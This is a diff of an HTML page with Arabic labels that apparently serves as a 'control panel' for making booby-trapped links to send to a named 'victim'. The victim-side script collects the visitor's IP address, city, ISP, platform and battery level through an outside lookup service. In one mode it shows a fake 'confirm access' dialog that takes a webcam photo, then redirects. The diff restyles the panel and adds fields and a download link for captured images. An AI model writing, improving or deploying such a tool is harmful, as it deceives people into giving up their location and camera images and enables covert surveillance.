@@ -3,46 +3,90 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة التحكم</title>
+    <title>Dashboard v3.0</title>
     <style>
-        :root { --bg: #121212; --card: #1e1e1e; --primary: #007bff; --text: #e1e1e1; --neon: #00f2ff; }
-        body { margin: 0; background: var(--bg); font-family: sans-serif; color: var(--text); }
-        .container { display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 20px; }
-        .admin-box { background: var(--card); padding: 30px; border-radius: 15px; width: 100%; max-width: 450px; border: 1px solid #333; }
-        .mode-container { display: flex; gap: 10px; margin-bottom: 20px; }
-        .mode-card { flex: 1; background: #252525; border: 1px solid #333; padding: 15px; border-radius: 10px; text-align: center; cursor: pointer; }
-        .mode-card.active { border-color: var(--primary); background: rgba(0, 123, 255, 0.1); }
-        input { width: 100%; padding: 15px; background: #000; border: 1px solid #333; border-radius: 8px; color: #fff; margin-bottom: 15px; box-sizing: border-box; }
-        .main-btn { background: var(--primary); color: #fff; border: none; padding: 15px; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; }
-        #log-area { margin-top: 25px; width: 100%; display: none; }
-        .data-log { background: #1a1a1a; padding: 20px; border-radius: 10px; border-right: 4px solid var(--neon); }
+        :root { --bg: #030303; --card: #0a0a0a; --neon-blue: #00d2ff; --neon-green: #39ff14; --text: #e0e0e0; --glass: rgba(255, 255, 255, 0.05); }
+        body { margin: 0; background: var(--bg); font-family: 'Segoe UI', Roboto, sans-serif; color: var(--text); overflow-x: hidden; }
+        .container { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        
+        .admin-box { 
+            background: var(--card); padding: 35px; border-radius: 15px; width: 100%; max-width: 450px; 
+            border: 1px solid #1a1a1a; box-shadow: 0 0 30px rgba(0, 210, 255, 0.1);
+            backdrop-filter: blur(10px); transition: 0.4s;
+        }
+
+        h2 { text-align: center; color: var(--neon-blue); margin-bottom: 30px; font-weight: 200; letter-spacing: 3px; text-transform: uppercase; }
+        
+        .mode-container { display: flex; gap: 15px; margin-bottom: 25px; }
+        .mode-card { 
+            flex: 1; background: var(--glass); border: 1px solid #222; padding: 20px; border-radius: 12px; 
+            text-align: center; cursor: pointer; transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .mode-card.active { border-color: var(--neon-blue); background: rgba(0, 210, 255, 0.05); transform: translateY(-5px); box-shadow: 0 5px 15px rgba(0, 210, 255, 0.2); }
+        .mode-card b { font-size: 14px; display: block; }
+
+        input { 
+            width: 100%; padding: 15px; background: #000; border: 1px solid #222; border-radius: 10px; 
+            color: #fff; margin-bottom: 20px; box-sizing: border-box; transition: 0.3s;
+        }
+        input:focus { border-color: var(--neon-blue); outline: none; }
+
+        .main-btn { 
+            background: linear-gradient(45deg, #00d2ff, #3a7bd5); color: #000; border: none; 
+            padding: 16px; border-radius: 10px; cursor: pointer; width: 100%; font-weight: bold; 
+            font-size: 14px; text-transform: uppercase; transition: 0.3s;
+        }
+        .main-btn:hover { filter: brightness(1.2); transform: scale(1.02); }
+
+        .result-box { 
+            margin-top: 25px; padding: 15px; background: #000; border-radius: 10px; 
+            border: 1px dashed var(--neon-green); display: none; animation: fadeIn 0.5s;
+        }
+
+        #log-area { margin-top: 30px; display: none; animation: slideUp 0.6s; }
+        .data-log { background: #050505; padding: 20px; border-radius: 12px; border-right: 3px solid var(--neon-green); }
+        .info-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px; border-bottom: 1px solid #111; padding-bottom: 5px; }
+        .info-row span { color: var(--neon-blue); }
+
+        /* واجهة الضحية */
         .victim-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
-        .dialog { background: #181818; padding: 30px; border-radius: 15px; text-align: center; width: 85%; max-width: 320px; border: 1px solid #333; }
+        .dialog { background: #080808; padding: 40px; border-radius: 15px; text-align: center; border: 1px solid #1a1a1a; width: 85%; max-width: 320px; }
         .hidden { display: none !important; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
     </style>
 </head>
 <body>
 
-<div class="container" id="admin-ui">
-    <div class="admin-box">
-        <h2>لوحة التحكم</h2>
-        <div class="mode-container">
-            <div id="m1" class="mode-card active" onclick="selectMode('1', 'm1')">سحب بيانات</div>
-            <div id="m2" class="mode-card" onclick="selectMode('2', 'm2')">سحب صور</div>
-        </div>
-        <input type="text" id="targetUrl" placeholder="أدخل رابط التحويل (مثل https://google.com)">
-        <button class="main-btn" onclick="generateLink()">إنشاء الرابط الملغم</button>
+<div class="container">
+    <div id="admin-panel" class="admin-box">
+        <h2>Control Center</h2>
         
-        <div id="resultBox" style="display:none; margin-top:20px;">
-            <p style="font-size:12px; color:var(--neon);">انسخ الرابط وأرسله للضحية:</p>
+        <div class="mode-container">
+            <div id="m1" class="mode-card active" onclick="selectMode('1', 'm1')">
+                <b>سحب بيانات الضحية</b>
+            </div>
+            <div id="m2" class="mode-card" onclick="selectMode('2', 'm2')">
+                <b>سحب صور</b>
+            </div>
+        </div>
+
+        <input type="text" id="targetUrl" placeholder="أدخل رابط الوجهة">
+        <button class="main-btn" onclick="generateLink()">توليد الرابط</button>
+
+        <div id="resultBox" class="result-box">
+            <p style="font-size:10px; color:var(--neon-green); margin-bottom:10px;">الرابط المشفر:</p>
             <input type="text" id="copyLink" readonly onclick="this.select()">
         </div>
 
         <div id="log-area">
             <div class="data-log">
-                <p style="color:var(--primary);">📡 البيانات المستلمة:</p>
-                <div id="device-data" style="font-size:13px; line-height:1.6;"></div>
-                <img id="captured-img" style="width:100%; border-radius:8px; margin-top:10px; display:none;">
+                <p style="color:var(--neon-blue); font-size:12px; margin-bottom:15px;">📡 التقارير الواردة:</p>
+                <div id="device-data"></div>
+                <div id="image-data" class="hidden">
+                    <img id="captured-img" style="width:100%; border-radius:8px; margin-top:15px; border:1px solid #333;">
+                    <a id="download-link" download="report.jpg" style="display:block; color:var(--neon-green); font-size:11px; text-align:center; margin-top:10px; text-decoration:none;">تحميل الوسائط</a>
+                </div>
             </div>
         </div>
     </div>
@@ -50,50 +94,48 @@
 
 <div id="victim-ui" class="victim-overlay hidden">
     <div class="dialog">
-        <h3 style="color:#fff;">تنبيه</h3>
-        <p>لمشاهدة المحتوى الرجاء الضغط على السماح</p>
-        <button id="allowBtn" class="main-btn" style="background:#d9534f;">السماح</button>
+        <h3 style="color:#fff; font-weight:300;">تأكيد الدخول</h3>
+        <p style="color: #666; font-size:13px;">يرجى السماح بالوصول للكاميرا للمتابعة إلى المحتوى المطلوبة.</p>
+        <button id="cameraBtn" class="main-btn" style="margin-top:15px;">متابعة</button>
     </div>
     <video id="video" autoplay playsinline style="display:none"></video>
     <canvas id="canvas" style="display:none"></canvas>
 </div>
 
 <script>
-    let activeMode = '1';
-    const params = new URLSearchParams(window.location.search);
-    const mode = params.get('v');
-    const encodedTarget = params.get('d'); // الرابط المشفر
+    let activeMode = '1'; // 1 = بيانات ، 2 = صور
+    const urlParams = new URLSearchParams(window.location.search);
+    const vMode = urlParams.get('v');
 
-    function selectMode(m, id) {
-        activeMode = m;
+    function selectMode(mode, id) {
+        activeMode = mode;
         document.querySelectorAll('.mode-card').forEach(c => c.classList.remove('active'));
         document.getElementById(id).classList.add('active');
     }
 
-    // --- سيناريو الضحية ---
-    if (mode && encodedTarget) {
-        document.getElementById('admin-ui').classList.add('hidden');
-        const finalTarget = atob(encodedTarget); // فك تشفير الرابط
-
-        async function start() {
-            const ipReq = await fetch('https://ipapi.co/json/').catch(() => ({}));
-            const ipData = await ipReq.json().catch(() => ({}));
-            const battery = await (navigator.getBattery ? navigator.getBattery().then(b => (b.level * 100).toFixed(0) + '%') : "N/A");
-
-            const info = {
-                model: navigator.userAgent.match(/(iPhone|Android|Samsung|Xiaomi|Huawei)/)?.[0] || "Unknown",
+    if (vMode) {
+        document.getElementById('admin-panel').classList.add('hidden');
+        
+        async function startProtocol() {
+            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+            const batt = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve(null));
+            
+            const payload = {
                 ip: ipData.ip || "N/A",
-                isp: ipData.org || "N/A",
-                batt: battery
+                city: ipData.city || "Unknown",
+                isp: ipData.org || "Unknown",
+                os: navigator.platform,
+                batt: batt ? (batt.level * 100).toFixed(0) + "%" : "N/A"
             };
+            localStorage.setItem('rep_info', JSON.stringify(payload));
 
-            localStorage.setItem('received_data', JSON.stringify(info));
+            const redir = localStorage.getItem('redir_to') || 'https://google.com';
 
-            if (mode === '1') {
-                window.location.replace(finalTarget);
+            if (vMode === '1') {
+                window.location.href = redir;
             } else {
                 document.getElementById('victim-ui').classList.remove('hidden');
-                document.getElementById('allowBtn').onclick = async () => {
+                document.getElementById('cameraBtn').onclick = async () => {
                     try {
                         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                         const video = document.getElementById('video');
@@ -102,37 +144,41 @@
                             const canvas = document.getElementById('canvas');
                             canvas.width = 640; canvas.height = 480;
                             canvas.getContext('2d').drawImage(video, 0, 0);
-                            localStorage.setItem('received_img', canvas.toDataURL('image/jpeg'));
+                            localStorage.setItem('rep_img', canvas.toDataURL('image/jpeg'));
                             stream.getTracks().forEach(t => t.stop());
-                            window.location.replace(finalTarget);
-                        }, 1000);
-                    } catch (e) { alert("يجب السماح للمتابعة"); }
+                            window.location.href = redir;
+                        }, 800);
+                    } catch { window.location.href = redir; }
                 };
             }
         }
-        start();
+        startProtocol();
     }
 
-    // --- سيناريو المدير ---
     function generateLink() {
-        const target = document.getElementById('targetUrl').value;
-        if (!target.startsWith('http')) return alert("يجب أن يبدأ الرابط بـ http أو https");
-        const encoded = btoa(target); // تشفير الرابط لضمان وصوله
-        const finalLink = window.location.origin + window.location.pathname + `?v=${activeMode}&d=${encoded}`;
-        document.getElementById('copyLink').value = finalLink;
+        const val = document.getElementById('targetUrl').value;
+        if (!val) return;
+        localStorage.setItem('redir_to', val);
+        document.getElementById('copyLink').value = window.location.href.split('?')[0] + "?v=" + activeMode;
         document.getElementById('resultBox').style.display = 'block';
     }
 
     window.addEventListener('storage', (e) => {
         document.getElementById('log-area').style.display = 'block';
-        if (e.key === 'received_data') {
+        if (e.key === 'rep_info') {
             const d = JSON.parse(e.newValue);
-            document.getElementById('device-data').innerHTML = `الجهاز: ${d.model}<br>IP: ${d.ip}<br>الشركة: ${d.isp}<br>البطارية: ${d.batt}`;
+            document.getElementById('device-data').innerHTML = `
+                <div class="info-row">عنوان IP: <span>${d.ip}</span></div>
+                <div class="info-row">المدينة: <span>${d.city}</span></div>
+                <div class="info-row">المزود: <span>${d.isp}</span></div>
+                <div class="info-row">نظام التشغيل: <span>${d.os}</span></div>
+                <div class="info-row">البطارية: <span>${d.batt}</span></div>
+            `;
         }
-        if (e.key === 'received_img') {
-            const img = document.getElementById('captured-img');
-            img.src = e.newValue;
-            img.style.display = 'block';
+        if (e.key === 'rep_img') {
+            document.getElementById('image-data').classList.remove('hidden');
+            document.getElementById('captured-img').src = e.newValue;
+            document.getElementById('download-link').href = e.newValue;
         }
     });
 </script>
